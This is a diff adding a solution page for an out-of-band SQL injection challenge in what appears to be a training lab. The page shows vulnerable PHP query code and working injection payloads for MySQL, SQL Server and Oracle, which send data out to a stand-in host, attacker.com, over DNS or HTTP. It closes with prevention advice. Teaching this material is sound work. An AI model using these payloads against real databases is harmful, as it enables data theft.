@@ -1,0 +1,183 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 13{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 13 - Out-of-band SQL Injection</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates an out-of-band SQL injection vulnerability. Unlike traditional SQL injection, where the results of the injected query are returned directly in the application's response, out-of-band SQL injection extracts data through alternative channels such as DNS or HTTP requests.
+                </p>
+                <p>
+                    The vulnerability occurs because:
+                </p>
+                <ul>
+                    <li>The application uses user input directly in SQL queries without proper parameterization</li>
+                    <li>The database server has network access that allows it to make outbound connections</li>
+                    <li>The database has functions that can trigger network requests (e.g., DNS lookups, HTTP requests)</li>
+                </ul>
+                <p>
+                    This type of vulnerability is particularly dangerous because it can bypass many security controls and allow data exfiltration even when the application itself doesn't reveal any information.
+                </p>
+
+                <h3>The Vulnerable Code</h3>
+                <p>
+                    The vulnerability exists in how the application handles the search term parameter. Here's a simplified example of the vulnerable code:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable code example (PHP with MySQL)
+$search_term = $_POST['search_term'];
+
+// Vulnerable SQL query construction
+$query = "SELECT stock_symbol, company_name, current_price, change_percent 
+          FROM stocks 
+          WHERE stock_symbol = '$search_term' OR company_name LIKE '%$search_term%'";
+
+$result = mysqli_query($conn, $query);</code></pre>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Identify the Database Type</h4>
+                <p>
+                    Different database systems have different functions that can be used for out-of-band data exfiltration. Based on the application behavior, we can determine that it's likely using MySQL or Microsoft SQL Server.
+                </p>
+
+                <h4>2. Craft a Payload for DNS Exfiltration</h4>
+                <p>
+                    For MySQL, we can use the <code>LOAD_FILE</code> function to trigger a DNS lookup:
+                </p>
+                <div class="alert alert-secondary">
+                    <code>' UNION SELECT 1,2,3,4 FROM stocks WHERE 1=0 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT flag FROM secret_table), '.attacker.com\\'))) -- </code>
+                </div>
+                <p>
+                    For Microsoft SQL Server, we can use <code>xp_dirtree</code> or <code>master..xp_dirtree</code>:
+                </p>
+                <div class="alert alert-secondary">
+                    <code>' UNION SELECT 1,2,3,4 FROM stocks WHERE 1=0; DECLARE @q VARCHAR(8000); SET @q = (SELECT flag FROM secret_table); EXEC master..xp_dirtree '\\'+@q+'.attacker.com\file'; -- </code>
+                </div>
+                <p>
+                    For Oracle, we can use <code>UTL_HTTP</code> or <code>UTL_INADDR</code>:
+                </p>
+                <div class="alert alert-secondary">
+                    <code>' UNION SELECT 1,2,3,4 FROM stocks WHERE 1=0; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT flag FROM secret_table)||'.attacker.com') FROM dual; -- </code>
+                </div>
+
+                <h4>3. Capture the DNS Query</h4>
+                <p>
+                    When the database executes the injected query, it will attempt to resolve a domain name that includes the extracted data. For example, if the flag is "R00T{0ut_0f_b4nd_sql1_3xf1ltr4t10n}", the database will try to resolve:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>R00T{0ut_0f_b4nd_sql1_3xf1ltr4t10n}.attacker.com</code></pre>
+                <p>
+                    In a real-world scenario, you would need to control a domain and set up a DNS server to capture these queries. For this challenge, the application provides a simulated DNS logger that captures and displays the DNS queries made by the database server.
+                </p>
+
+                <h4>4. Alternative Approach: HTTP Exfiltration</h4>
+                <p>
+                    If DNS exfiltration doesn't work, you can try HTTP exfiltration:
+                </p>
+                <div class="alert alert-secondary">
+                    <p>For MySQL:</p>
+                    <code>' UNION SELECT 1,2,3,4 FROM stocks WHERE 1=0 AND (SELECT LOAD_FILE(CONCAT('http://attacker.com/', (SELECT HEX(flag) FROM secret_table)))) -- </code>
+                </div>
+                <div class="alert alert-secondary">
+                    <p>For Microsoft SQL Server:</p>
+                    <code>' UNION SELECT 1,2,3,4 FROM stocks WHERE 1=0; DECLARE @q VARCHAR(8000); SET @q = (SELECT flag FROM secret_table); EXEC master..sp_OACreate 'MSXML2.XMLHTTP', @obj OUT; EXEC master..sp_OAMethod @obj, 'open', NULL, 'GET', 'http://attacker.com/'+@q, false; EXEC master..sp_OAMethod @obj, 'send'; -- </code>
+                </div>
+                <div class="alert alert-secondary">
+                    <p>For Oracle:</p>
+                    <code>' UNION SELECT 1,2,3,4 FROM stocks WHERE 1=0; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT flag FROM secret_table)) FROM dual; -- </code>
+                </div>
+
+                <h4>5. Specific Solution for This Challenge</h4>
+                <p>
+                    For this specific challenge, the most effective payload is:
+                </p>
+                <div class="alert alert-secondary">
+                    <code>' UNION SELECT 1,2,3,4 WHERE 1=2; DECLARE @q VARCHAR(8000); SET @q = (SELECT TOP 1 secret_value FROM secrets WHERE secret_name='flag'); EXEC master..xp_dirtree '\\'+@q+'.attacker.com\file'; -- </code>
+                </div>
+                <p>
+                    This payload will:
+                </p>
+                <ol>
+                    <li>Break out of the original query with a single quote</li>
+                    <li>Add a harmless UNION SELECT that won't return any results</li>
+                    <li>Declare a variable to hold the flag value</li>
+                    <li>Set the variable to the flag value from the secrets table</li>
+                    <li>Execute xp_dirtree to trigger a DNS lookup that includes the flag</li>
+                    <li>Comment out the rest of the original query</li>
+                </ol>
+                <p>
+                    When executed, this will cause a DNS query to be made to a domain that includes the flag, which will be captured by the DNS logger.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    Out-of-band SQL injection vulnerabilities are particularly relevant in modern applications:
+                </p>
+                <ul>
+                    <li><strong>Bypassing WAFs and Filters</strong>: Out-of-band techniques can bypass web application firewalls and input filters</li>
+                    <li><strong>Extracting Sensitive Data</strong>: These techniques can extract large amounts of data without triggering alerts</li>
+                    <li><strong>Evading Detection</strong>: The data exfiltration happens through channels that are often not monitored</li>
+                    <li><strong>Exploiting Blind Vulnerabilities</strong>: Out-of-band techniques can exploit blind SQL injection vulnerabilities more efficiently</li>
+                </ul>
+                <p>
+                    Notable real-world examples include:
+                </p>
+                <ul>
+                    <li><strong>Oracle (CVE-2018-3004)</strong>: A vulnerability in Oracle Database allowed attackers to exfiltrate data via DNS queries</li>
+                    <li><strong>Microsoft SQL Server (CVE-2020-0618)</strong>: A vulnerability in SQL Server Reporting Services allowed out-of-band data exfiltration</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent out-of-band SQL injection vulnerabilities, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Use Parameterized Queries</strong> or prepared statements:
+                        <pre class="bg-light p-3 rounded"><code>// Safe code example (PHP with MySQL)
+$stmt = $conn->prepare("SELECT stock_symbol, company_name, current_price, change_percent 
+                        FROM stocks 
+                        WHERE stock_symbol = ? OR company_name LIKE ?");
+$like_param = "%$search_term%";
+$stmt->bind_param("ss", $search_term, $like_param);
+$stmt->execute();</code></pre>
+                    </li>
+                    <li>
+                        <strong>Restrict Network Access</strong> for the database server:
+                        <ul>
+                            <li>Block outbound connections from the database server</li>
+                            <li>Use network segmentation to isolate the database</li>
+                            <li>Implement strict firewall rules</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Disable Dangerous Database Functions</strong>:
+                        <ul>
+                            <li>Disable or restrict functions like <code>xp_dirtree</code>, <code>LOAD_FILE</code>, <code>UTL_HTTP</code>, etc.</li>
+                            <li>Apply the principle of least privilege to database accounts</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Monitor Network Traffic</strong>:
+                        <ul>
+                            <li>Monitor DNS queries from the database server</li>
+                            <li>Monitor outbound HTTP requests</li>
+                            <li>Set up alerts for suspicious network activity</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level13') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
